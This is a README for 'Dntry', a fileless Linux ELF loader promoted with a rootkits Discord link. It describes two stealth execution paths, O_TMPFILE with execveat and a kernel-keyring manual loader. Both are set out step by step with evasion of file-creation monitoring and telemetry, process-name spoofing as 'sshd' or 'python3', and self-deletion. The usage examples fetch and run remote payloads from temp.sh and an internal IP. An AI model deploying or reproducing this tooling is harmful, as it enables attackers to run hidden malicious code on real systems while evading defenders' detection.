# Dntry

<img src="https://i.imgur.com/O15awdJ.png" alt="Dntry" width="600"/>

Fileless ELF loader with six execution modes across two techniques.

- https://discord.gg/rootkits

## Techniques

**O_TMPFILE + execveat(AT_EMPTY_PATH)**
Allocates an anonymous inode on a real filesystem with no directory entry, writes the payload into it, and executes via `execveat` with `AT_EMPTY_PATH`. No `memfd_create`, no named file. Since the anonymous inode is never linked into the directory tree, no `IN_CREATE` or `FAN_CREATE` event is generated. Process shows as `/tmp/#N (deleted)` in telemetry.

**Kernel keyring + userland exec**
Stores the ELF payload in kernel slab memory via `add_key("user")` with no fd, no inode and no VFS involvement. The payload is read back via `keyctl(KEYCTL_READ)`, the key is revoked, and the ELF is loaded manually by walking PT_LOAD segments and jumping to the entry point with no `execve` or `execveat` call.

## Requirements

| | |
|---|---|
| Kernel | 4.17+ (O_TMPFILE + execveat + MAP_FIXED_NOREPLACE) |
| Compiler | gcc |
| Build tools | make |
| HTTPS (optional) | libssl-dev |

```sh
sudo apt install gcc make
sudo apt install libssl-dev  # for HTTPS
```

## Build

```sh
make          # HTTP only
make https    # with HTTPS support
make bebop    # test payload (sleeps 30s, prints PID)
make demo     # diagnostic payload (prints pid, exe, maps)
```

## Usage

```sh
# O_TMPFILE modes
./dntry file  <elf>  [spoof_name]
./dntry http  <url>  [spoof_name]
./dntry stdin [spoof_name]

# Keyring modes
./dntry kfile  <elf>  [spoof_name]
./dntry khttp  <url>  [spoof_name]
./dntry kstdin [spoof_name]
```

`spoof_name` becomes `argv[0]` of the loaded process and the thread name via `prctl(PR_SET_NAME)`, defaults to `python3`.

## Examples

```sh
cat payload.elf | ./dntry kstdin sshd

./dntry khttp https://temp.sh/aBcDe/payload sshd

./dntry http http://192.168.1.10:8080/payload python3
```

## Keyring quota

The default per-user quota is 20000 bytes via `/proc/sys/kernel/keys/maxbytes` and root has a separate quota of 25 MB via `/proc/sys/kernel/keys/root_maxbytes`.

## How it works (O_TMPFILE path)

1. `open("/tmp", O_TMPFILE|O_RDWR, 0700)` allocates an anonymous inode with no directory entry
2. Payload bytes are written into the fd
3. The fd is reopened read-only via `/proc/self/fd/` to clear the write flag (`ETXTBSY`)
4. `prctl(PR_SET_NAME)` and cmdline overwrite spoof the process identity
5. Loader unlinks itself via `readlink("/proc/self/exe")`
6. `execveat(fd, "", argv, envp, AT_EMPTY_PATH)` executes the fd directly with no path string

## How it works (keyring path)

1. `add_key("user", "_dntry", elf_bytes, size, KEY_SPEC_SESSION_KEYRING)` stores the ELF in slab memory
2. `keyctl(KEYCTL_READ)` is called twice: first as a size probe, then to copy into an anonymous mapping
3. `keyctl(KEYCTL_REVOKE)` frees the slab copy
4. PT_LOAD segments are mapped into anonymous memory with `MAP_FIXED_NOREPLACE`
5. `prctl(PR_SET_NAME)` and cmdline overwrite spoof the process identity
6. Loader unlinks itself via `readlink("/proc/self/exe")`
7. Registers are zeroed and execution jumps to the ELF entry point
